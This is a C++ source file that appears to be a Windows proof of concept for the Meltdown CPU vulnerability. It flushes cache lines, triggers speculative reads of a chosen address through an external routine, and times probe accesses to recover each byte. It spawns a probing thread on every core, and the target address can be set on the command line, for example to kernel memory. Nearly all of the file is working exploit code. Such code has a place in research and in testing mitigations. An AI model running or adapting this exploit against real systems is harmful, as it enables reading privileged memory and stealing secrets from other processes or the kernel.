#include <stdio.h>
#include <intrin.h>
#include <windows.h>
#include <assert.h>
#include <cstdint>

char TestData[] = "Boring data";
constexpr int probe_lines = 256;
__declspec(thread) uint64_t tat[probe_lines];
__declspec(thread) uint8_t probe[probe_lines * 4096];

extern "C" {
  uint64_t memory_access(void *p);
  void ooe(void *target, void *probe_start);
}

class bstream {
private:
  uint64_t val_;

  void put(int c) {
    int h = 0;
    if (c >= '0' && c <= '9') h = c - '0';
    else if (c >= 'A' && c <= 'F') h = c - 'A' + 10;
    else if (c >= 'a' && c <= 'f') h = c - 'a' + 10;
    else return;
    val_ = val_ << 4 | h;
  }

public:
  bstream() : val_(0) {}
  bstream(const char *str) : val_(0) {
    for (const char *p = str; *p; ++p)
      put(*p);
  }

  operator uint64_t() const {
    return val_;
  }

  template <typename T>
  T As() const {
    return reinterpret_cast<T>(val_);
  }
};

void bstream_test() {
  assert(bstream("ffffe485c16df5c0") == 0xffffe485c16df5c0);
  assert(bstream("0xffffe485c16df5c0") == 0xffffe485c16df5c0);
  assert(bstream("ffffe485`c16df610") == 0xffffe485c16df610);
  assert(bstream("0xffffe485`c16df610") == 0xffffe485c16df610);
}

struct probe_result{
  uint8_t value_;
  int trial_;
  uint64_t tat_;
};

void meltdown_full(uint8_t *target_address, probe_result &result) {
  constexpr uint32_t max_trial = 200000;
  result = {};
  for (; result.trial_ < max_trial; ++result.trial_) {
    for (int i = 0; i < probe_lines; ++i)
      _mm_clflush(probe + i * 4096);

    __try {
      ooe(target_address, probe);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}

    for (int i = 0; i < probe_lines; ++i)
      tat[i] = memory_access(probe + i * 4096);

    int idx_min = 0;
    for (int i = 0; i < probe_lines; ++i) {
      if (tat[i] < tat[idx_min]) idx_min = i;
    }

    if (tat[idx_min] < 100 && idx_min != 0) {
      result.value_ = static_cast<uint8_t>(idx_min);
      result.tat_ = tat[idx_min];
      break;
    }
  }
}

struct GlobalContext {
  uint8_t *target_start_;
  uint32_t read_count_;
} g_context = {};

DWORD WINAPI ProbingThread(LPVOID param) {
  if (auto result = reinterpret_cast<probe_result*>(param)) {
    uint8_t *p = g_context.target_start_;
    uint8_t *target_end = p + g_context.read_count_;
    while (p < target_end) {
      meltdown_full(p++, *result);
      ++result;
    }
  }
  ExitThread(0);
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    bstream_test();
    printf("USAGE: meltdown <read_count> [start]\n");
    return 1;
  }

  g_context.target_start_ = argc > 2 ? bstream(argv[2]).As<uint8_t*>()
                                     : reinterpret_cast<uint8_t*>(TestData);
  auto read_count = g_context.read_count_ = atoi(argv[1]);
  printf("Target range: %p - %p\n\n",
         g_context.target_start_,
         g_context.target_start_ + read_count);

  SYSTEM_INFO sysinfo{};
  GetSystemInfo(&sysinfo);
  //sysinfo.dwNumberOfProcessors = 1;
  printf("You have %d CPU cores.  Starting probing threads...\n\n",
         sysinfo.dwNumberOfProcessors);

  auto results = new probe_result[sysinfo.dwNumberOfProcessors * read_count];
  auto threads = new HANDLE[sysinfo.dwNumberOfProcessors];
  memset(probe, 0xfe, sizeof(probe));

  for (DWORD i = 0; i < sysinfo.dwNumberOfProcessors; ++i) {
    DWORD tid;
    threads[i] = CreateThread(/*lpThreadAttributes*/nullptr,
                              /*dwStackSize*/0,
                              ProbingThread,
                              &results[i * read_count],
                              CREATE_SUSPENDED,
                              &tid);
    SetThreadAffinityMask(threads[i], 1i64 << i);
    printf("running tid:%04x for core#%d\n", tid, i);
    ResumeThread(threads[i]);
  }
  printf("\n");
  WaitForMultipleObjects(sysinfo.dwNumberOfProcessors,
                         threads,
                         /*bWaitAll*/TRUE,
                         INFINITE);
  for (DWORD i = 0; i < sysinfo.dwNumberOfProcessors; ++i)
    CloseHandle(threads[i]);
  delete [] threads;

  for (DWORD i = 0; i < sysinfo.dwNumberOfProcessors; ++i) {
    printf("core#%d: ", i);
    for (uint32_t j = 0; j < read_count; ++j)
      printf(" %02x", results[j + i * read_count].value_);
    printf("\n");
  }
  delete [] results;

  return 0;
}
